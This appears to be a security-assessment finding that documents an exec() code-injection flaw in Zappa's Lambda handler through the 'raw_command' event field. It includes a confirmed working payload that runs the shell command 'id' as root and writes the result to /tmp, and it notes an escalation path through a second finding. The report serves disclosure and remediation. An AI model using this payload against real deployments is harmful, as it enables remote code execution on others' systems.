# VULN-001 — raw_command event field -> exec() RCE

**Software**: Zappa
**Repository**: https://github.com/zappa/Zappa
**Affected version**: 0.62.1 (`zappa/__init__.py:34`) | commit-pinned: untagged master, no tagged release
**Status**: CONFIRMED
**Severity (static)**: High (Critical via VULN-012)
**Target commit**: e9ecb1feea14974f7bd76a908ca22ba1c9860d36
**Validated at**: 2026-09-29

## Preconditions
- Surface B via the harness `/_sim/raw-event` (models a direct Lambda invocation).

## Request / Response
See `request.http` / `response.txt` / `run.log`. `{"raw_command": "import os; open('/tmp/vuln001_<rand>','w').write('uid='+str(os.getuid())+' | '+os.popen('id').read())"}` → the marker file contains e.g.
`uid=0 | uid=0(root) gid=0(root) groups=0(root)`.

## Observation
`handler.py:919` runs `exec(event["raw_command"])` in the live handler process with module globals. The
event-supplied Python imported `os`, ran the OS command `id`, and wrote its output to disk — arbitrary code
+ shell execution, exactly as predicted.

## Side effects
Wrote a random-named marker to `/tmp` in the gateway container; the exploit removes it afterward.

## Research & references
- CWE-95 (Eval Injection), CWE-94. OWASP Serverless Top-10 event-injection.

## If FAILED / NEEDS_MANUAL
n/a — CONFIRMED. Surface-B on its own needs `lambda:InvokeFunction`; VULN-012 makes it any-AWS-account.
